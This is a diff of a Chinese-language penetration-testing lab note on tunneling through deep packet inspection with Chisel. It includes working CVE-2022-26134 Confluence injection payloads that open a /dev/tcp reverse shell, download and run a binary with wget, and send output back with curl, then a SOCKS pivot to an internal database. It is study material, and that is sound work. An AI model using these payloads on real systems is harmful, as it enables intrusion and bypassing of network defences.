@@ -450,3 +450,218 @@ Ok.
 C:\Windows\system32>netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.226.64
 ```
 # Tunneling Through Deep Packet Inspection
+包含 HTTP tunneling 及 chisel 使用方法
+## HTTP Tunneling Fundamentals
+>[!Note]
+>**深度封包檢測 Deep Packet Inspection (DPI)**\
+DPI 是一種監控網路流量的技術，它可以根據一組規則檢查並阻擋特定類型的封包。\
+例如： 
+✅ 允許 一般的 HTTP(S) 流量\
+❌ 封鎖 SSH 連線、VPN 流量、或其他不符合政策的協議
+
+情境範例，攻擊者成功入侵了 CONFLUENCE01，但發現： 
+- 所有 Outbound 流量 除了 HTTP (TCP/80, TCP/443) 以外都被封鎖
+- 所有 Inbound 端口 只開放 TCP/8090，無法透過 Reverse Shell 直接連回攻擊者的 Kali 機器
+- SSH Port Forwarding 也無法使用，因為 SSH 連線會被 DPI 阻擋
+
+![image](https://hackmd.io/_uploads/rkG8NhBiyx.png)
+> FIREWALL/INSPECTOR 代替簡易的 Firewall\
+> 雖然我們有 PGDATABASE01 credentials， 但仍然需要 tunnel 進到內網，但環境只允許 HTTP connection OutBound
+
+代表傳統的 Reverse Shell 或 SSH Tunneling 都行不通，唯一能用的協議是 HTTP。
+
+>[!Note]
+>**HTTP 通道 (HTTP Tunneling)** 的運作方式:\
+HTTP Tunneling 是將其他類型的網路流量（如 SSH 或 TCP ）包裝成 HTTP request，讓流量看起來像正常的網頁流量，從而繞過防火牆的封鎖。\
+
+在以上情境範例中，解決方案： 
+- 在 CONFLUENCE01 上架設 HTTP Proxy
+- 讓所有 OutBound 的 SSH、TCP 連線都封裝成 HTTP 請求，透過 proxy發送
+- Kali 解封裝這些請求，再轉發到內部的 PGDATABASE01 伺服器
+
+這樣一來，DPI 只會看到 看起來像一般 HTTP 流量的隧道連線，無法阻擋我們的存取。
+
+### HTTP Tunneling with Chisel
+[Chisel](https://github.com/jpillora/chisel) 是一個 HTTP tunneling tool，它將我們的 data stream 封裝在 HTTP 中。它還在隧道內使用 SSH protocol，因此我們的資料會被加密。\
+Chisel 使用 client/server model。需要設定一個 Chisel server，接受來自 Chisel client 的連線。\
+根據 Server & Client configurations，有各種 port forwarding 可用。對於此環境來說特別有用的是 reverse port forwarding，類似於 SSH remote port forwarding。
+
+#### 1. 在 Kali 啟動 Apache 提供 Chisel client binary
+在 Kali 上執行一個 Chisel Server，接收來自在 CONFLUENCE01 上執行的 Chisel Client 連線。\
+Chisel 將在 Kali 綁定一個 SOCKS proxy port。 Chisel Server 將封裝(encapsulate) 並透過 SOCKS port 發送內容，接著透過 HTTP tunnel（SSH 加密）推送。\
+在 Chisel Client 會對其進行解封裝(decapsulate)，並推送到對應 address\
+![image](https://hackmd.io/_uploads/BkPc02BjJx.png)
+>  Kali 上的 Chisel Server 監聽 TCP 1080 (SOCKS proxy port)
+
+我們將在 Chisel Server 上使用 `--reverse` flag ([Chisel guide](https://github.com/jpillora/chisel#usage)) 讓 client 端連線。因此需要在 CONFLUENCE01(Chisel client) 安裝 Chisel client binary
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo cp $(which chisel) /var/www/html/
+
+┌──(chw㉿CHW)-[~]
+└─$ ls /var/www/html
+chisel  index.html  index.nginx-debian.html  nc.exe  plink.exe
+
+┌──(chw㉿CHW)-[~]
+└─$ sudo systemctl start apache2
+```
+#### 2. Confluence Injection & 載入 Chisel client
+使用與 [SSH Port Forwarding LAB](https://hackmd.io/@CHW/rkjNgyi51x#Port-Forwarding-with-Linux-Tools) 中相同的弱點 CVE-2022-26134 (Confluence Injection Payload)，注入 Reverse Shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.226.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.220/5678%200%3E%261%27%29.start%28%29%22%29%7D/
+
+```
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 5678
+listening on [any] 5678 ...
+connect to [192.168.45.220] from (UNKNOWN) [192.168.226.63] 57320
+bash: cannot set terminal process group (3082): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
+$ 
+```
+在 CONFLUENCE01 載入 Chisel client binary
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
+$ wget 192.168.45.220/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+...  
+
+2025-03-05 12:34:37 (719 KB/s) - ‘/tmp/chisel’ saved [8986384/8986384]
+
+```
+以上 Confluence Injection + 載入 Chisel client binary
+可以合併在 Confluence Injection payload 執行 bash:
+```
+curl http://192.168.223.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.213/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
+```
+>`curl http://192.168.223.63:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','wget 192.168.45.213/chisel -O /tmp/chisel && chmod +x /tmp/chisel').start()")}/`
+
+透過 apache2/access.log 確認是否成功存取 
+```
+┌──(chw㉿CHW)-[~]
+└─$ tail -f /var/log/apache2/access.log
+...
+192.168.223.63 - - [05/Mar/2025:10:54:43 -0500] "GET /chisel HTTP/1.1" 200 8986651 "-" "Wget/1.20.3 (linux-gnu)"
+```
+
+
+#### 3. 在 Kali 設置 Chisel Server
+```
+┌──(chw㉿CHW)-[~]
+└─$ chisel server --port 8080 --reverse
+2025/03/05 10:59:09 server: Reverse tunnelling enabled
+2025/03/05 10:59:09 server: Fingerprint Hak4ZQEpdrSrh6XREINVXnX2epeiu/fPTOJDFF89oSI=
+2025/03/05 10:59:09 server: Listening on http://0.0.0.0:8080
+```
+>`--port 8080`: 設定 HTTP 伺服器的端口\
+`--reverse` → 允許 反向 SOCKS Tunnel
+>> Chisel Server 啟動監聽 8080 port，並已啟用 reverse tunneling
+
+利用 Tcpdump 確認是否成功監聽
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo tcpdump -nvvvXi tun0 tcp port 8080
+tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+```
+>`-n`: 不解析 DNS (只顯示 IP 地址)\
+`-vvv`:	最詳細資訊 (Extremely verbose mode)\
+`-X`: 顯示封包內容 (HEX & ASCII 格式)\
+`-i tun0`: 指定監聽 tun0 interface\
+`tcp port 8080`: 只攔截 TCP 8080 端口的流量
+
+#### 4. 在 Target Machine 啟動 Chisel Client
+在 CONFLUENCE01 執行：\
+`/tmp/chisel client 192.168.45.213:8080 R:socks`
+> `R:socks`; 建立 SOCKS 代理 (Port 1080)
+
+透過 Confluence Injection payload 注入
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.223.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.213:8080%20R:socks%27%29.start%28%29%22%29%7D/
+
+```
+但 Tcpdump 沒有任何輸出，Chisel Server 也沒有顯示任何 activity\
+👉🏻 輸出 error output，指定 stdout 和 stderr\
+`/tmp/chisel client 192.168.45.213:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.213:8080/`\
+一樣透過 Confluence Injection payload 執行：
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.223.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.213:8080/%27%29.start%28%29%22%29%7D/
+```
+查看 Tcpdump 輸出
+```
+...
+11:51:10.541434 IP (tos 0x0, ttl 61, id 3355, offset 0, flags [DF], proto TCP (6), length 269)
+    192.168.223.63.44416 > 192.168.45.213.8080: Flags [P.], cksum 0xc239 (correct), seq 1:218, ack 1, win 502, options [nop,nop,TS val 1858903610 ecr 3982602], length 217: HTTP, length: 217
+        POST / HTTP/1.1
+        Host: 192.168.45.213:8080
+        User-Agent: curl/7.68.0
+        Accept: */*
+        Content-Length: 64
+        Content-Type: application/x-www-form-urlencoded
+        
+        bash: /tmp/chisel: cannot execute binary file: Exec format error [|http]
+...
+```
+> 工作環境是 MAC: ARM (aarch64)，改丟 x86_64 (amd64)
+
+(更改版本後)\
+Kali Chisel Server 顯示連線成功
+```
+┌──(chw㉿CHW)-[~]
+└─$ chisel server --port 8080 --reverse
+2025/03/05 12:19:59 server: Reverse tunnelling enabled
+2025/03/05 12:19:59 server: Fingerprint /3ssFfIIRcOmcR0G+9LAcztNy2WKFxWk8VEkST81lss=
+2025/03/05 12:19:59 server: Listening on http://0.0.0.0:8080
+2025/03/05 12:20:57 server: session#1: Client version (1.8.1) differs from server version (1.10.1-0kali1)
+2025/03/05 12:20:57 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+
+```
+
+可使用 `ss -ntplu` 檢查 SOCKS proxy 狀態
+```
+┌──(chw㉿CHW)-[~]
+└─$ ss -ntplu                                                                                              
+Netid    State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process               
+tcp      LISTEN    0          128                  0.0.0.0:22                 0.0.0.0:*                                              
+tcp      LISTEN    0          4096               127.0.0.1:1080               0.0.0.0:*        users:(("chisel",pid=722835,fd=7))    
+tcp      LISTEN    0          128                     [::]:22                    [::]:*                                              
+tcp      LISTEN    0          511                        *:80                       *:*                                              
+tcp      LISTEN    0          4096                       *:8080                     *:*        users:(("chisel",pid=722835,fd=3)) 
+```
+> SOCKS proxy port 1080 正在監聽
+
+#### 5. 透過 SOCKS 代理存取內網
+編輯 /etc/proxychains4.conf
+```
+socks5 127.0.0.1 1080
+```
+可以透過 proxychains 掃描內網 IP
+```
+proxychains nmap -sT -Pn -p22 10.4.223.215
+```
+將 Ncat 指令傳遞給 ProxyCommand。 建構指令告訴 Ncat 使用 socks5 協定和 `127.0.0.1:1080` proxy socket。 `%h`和 `%p` 代表 SSH command host and port values，SSH 將在執行命令之前填入這些值。
+```
+┌──(chw㉿CHW)-[~]
+└─$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.223.215
+The authenticity of host '10.4.223.215 (<no hostip for proxy command>)' can't be established.
+ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:14: [hashed name]
+    ~/.ssh/known_hosts:16: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+...
+database_admin@pgdatabase01:~$ ls
+```
+> `-o ProxyCommand='...'`:指定一個 ProxyCommand，讓 SSH 透過 SOCKS5 代理伺服器連接目標主機 (10.4.223.215)\
+> `--proxy-type socks5`：使用 SOCKS5 proxy (所有 SSH 連線請求都會經過 SOCKS5 Tunnel)\
+`--proxy 127.0.0.1:1080`：SOCKS5 代理位於 127.0.0.1 的 1080 port (通常是 Chisel 或 ProxyChains 設定的 proxy server)\
+`%h` 代表 目標主機 (10.4.223.215)
+`%p` 代表 目標端口 (22，預設 SSH 端口)
+
+## DNS Tunneling Fundamentals
